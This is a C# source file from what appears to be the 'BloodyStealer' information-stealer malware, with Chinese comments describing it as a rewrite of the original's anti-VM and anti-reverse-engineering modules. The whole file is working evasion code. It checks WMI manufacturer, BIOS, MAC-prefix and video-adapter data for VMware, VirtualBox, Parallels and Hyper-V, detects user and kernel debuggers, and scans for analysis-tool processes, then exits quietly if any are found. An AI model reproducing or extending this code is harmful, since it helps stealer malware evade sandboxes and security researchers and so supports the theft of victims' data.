using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace BloodyStealer
{
    /// <summary>
    /// 反分析功能 - 检测虚拟机环境和调试器
    /// 原始代码: Application.Anti.VT.Core和Application.Anti.Reverse.Core
    /// </summary>
    internal static class AntiAnalysis
    {
        /// <summary>
        /// 检测虚拟机环境
        /// 原始代码: Application.Anti.VT.Core.Execute()
        /// </summary>
        public static void CheckVirtualMachine()
        {
            if (IsVirtualMachine())
            {
                Environment.Exit(0);
            }
        }

        /// <summary>
        /// 检测调试器和分析工具
        /// 原始代码: Application.Anti.Reverse.Core.Execute()
        /// </summary>
        public static void CheckDebuggers()
        {
            if (IsDebugging() || IsAnalysisTool())
            {
                Environment.Exit(0);
            }
        }

        #region 虚拟机检测

        /// <summary>
        /// 检测是否在虚拟机环境中运行
        /// </summary>
        /// <returns>是否在虚拟机中</returns>
        private static bool IsVirtualMachine()
        {
            // 检测虚拟机制造商
            if (CheckVirtualMachineManufacturer())
                return true;

            // 检测虚拟机MAC地址
            if (CheckVirtualMachineMac())
                return true;

            // 检测虚拟机BIOS信息
            if (CheckVirtualMachineBios())
                return true;

            // 检测虚拟机显卡
            if (CheckVirtualMachineDisplay())
                return true;

            return false;
        }

        /// <summary>
        /// 检测计算机制造商是否与已知虚拟机制造商匹配
        /// </summary>
        /// <returns>是否是虚拟机</returns>
        private static bool CheckVirtualMachineManufacturer()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string manufacturer = obj["Manufacturer"]?.ToString().ToLower() ?? "";
                        string model = obj["Model"]?.ToString().ToLower() ?? "";

                        foreach (string vmName in Settings.VmNames)
                        {
                            if (manufacturer.Contains(vmName.ToLower()) || model.Contains(vmName.ToLower()))
                            {
                                return true;
                            }
                        }
                    }
                }
            }
            catch
            {
                // 忽略错误
            }

            return false;
        }

        /// <summary>
        /// 检测MAC地址是否与已知虚拟机MAC前缀匹配
        /// </summary>
        /// <returns>是否是虚拟机</returns>
        private static bool CheckVirtualMachineMac()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True"))
                {
                    string[] vmMacPrefixes = new string[]
                    {
                        "00:05:69", // VMware
                        "00:0C:29", // VMware
                        "00:1C:14", // VMware
                        "00:50:56", // VMware
                        "00:1c:42", // Parallels
                        "08:00:27"  // VirtualBox
                    };

                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string macAddress = obj["MacAddress"]?.ToString() ?? "";
                        
                        foreach (string prefix in vmMacPrefixes)
                        {
                            if (macAddress.StartsWith(prefix, StringComparison.OrdinalIgnoreCase))
                            {
                                return true;
                            }
                        }
                    }
                }
            }
            catch
            {
                // 忽略错误
            }

            return false;
        }

        /// <summary>
        /// 检测BIOS信息是否与虚拟机相关
        /// </summary>
        /// <returns>是否是虚拟机</returns>
        private static bool CheckVirtualMachineBios()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string version = obj["Version"]?.ToString().ToLower() ?? "";
                        string serialNumber = obj["SerialNumber"]?.ToString().ToLower() ?? "";
                        string manufacturer = obj["Manufacturer"]?.ToString().ToLower() ?? "";

                        foreach (string vmName in Settings.VmNames)
                        {
                            if (version.Contains(vmName.ToLower()) || 
                                serialNumber.Contains(vmName.ToLower()) || 
                                manufacturer.Contains(vmName.ToLower()))
                            {
                                return true;
                            }
                        }
                    }
                }
            }
            catch
            {
                // 忽略错误
            }

            return false;
        }

        /// <summary>
        /// 检查显卡信息是否与虚拟机相关
        /// </summary>
        /// <returns>是否是虚拟机</returns>
        private static bool CheckVirtualMachineDisplay()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string name = obj["Name"]?.ToString().ToLower() ?? "";
                        
                        if (name.Contains("vm") || 
                            name.Contains("virtual") || 
                            name.Contains("vmware") || 
                            name.Contains("remotefx") || 
                            name.Contains("hyper-v") || 
                            name.Contains("citrix") || 
                            name.Contains("xen"))
                        {
                            return true;
                        }
                    }
                }
            }
            catch
            {
                // 忽略错误
            }

            return false;
        }

        #endregion

        #region 调试器检测

        /// <summary>
        /// 检测是否存在调试器
        /// </summary>
        /// <returns>是否存在调试器</returns>
        private static bool IsDebugging()
        {
            try
            {
                // 检测用户级调试
                if (Debugger.IsAttached)
                    return true;

                // 检测内核级调试
                if (IsKernelDebugging())
                    return true;

                return false;
            }
            catch
            {
                // 忽略错误
                return false;
            }
        }

        /// <summary>
        /// 检测是否存在内核级调试
        /// </summary>
        /// <returns>是否存在内核级调试</returns>
        private static bool IsKernelDebugging()
        {
            try
            {
                // 导入NtQuerySystemInformation API
                IntPtr systemInformationPtr = Marshal.AllocHGlobal(sizeof(int));
                try
                {
                    uint status = NtQuerySystemInformation(0x23, systemInformationPtr, sizeof(int), IntPtr.Zero);
                    if (status == 0)
                    {
                        int enabled = Marshal.ReadInt32(systemInformationPtr);
                        return enabled != 0;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(systemInformationPtr);
                }
            }
            catch
            {
                // 忽略错误
            }

            return false;
        }

        /// <summary>
        /// 检测是否存在分析工具
        /// </summary>
        /// <returns>是否存在分析工具</returns>
        private static bool IsAnalysisTool()
        {
            try
            {
                // 检测运行中的分析进程
                if (CheckAnalysisProcesses())
                    return true;

                return false;
            }
            catch
            {
                // 忽略错误
                return false;
            }
        }

        /// <summary>
        /// 检测是否有反病毒/分析工具正在运行
        /// </summary>
        /// <returns>是否有分析工具在运行</returns>
        private static bool CheckAnalysisProcesses()
        {
            try
            {
                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes)
                {
                    try
                    {
                        string processName = process.ProcessName.ToLower();
                        
                        foreach (string badProcess in Settings.BadProcesses)
                        {
                            if (processName.Contains(badProcess.ToLower()))
                            {
                                return true;
                            }
                        }
                    }
                    catch
                    {
                        // 忽略个别进程错误
                    }
                }
            }
            catch
            {
                // 忽略错误
            }

            return false;
        }

        #endregion

        #region 外部API导入

        [DllImport("ntdll.dll")]
        private static extern uint NtQuerySystemInformation(uint SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, IntPtr ReturnLength);

        #endregion
    }
} 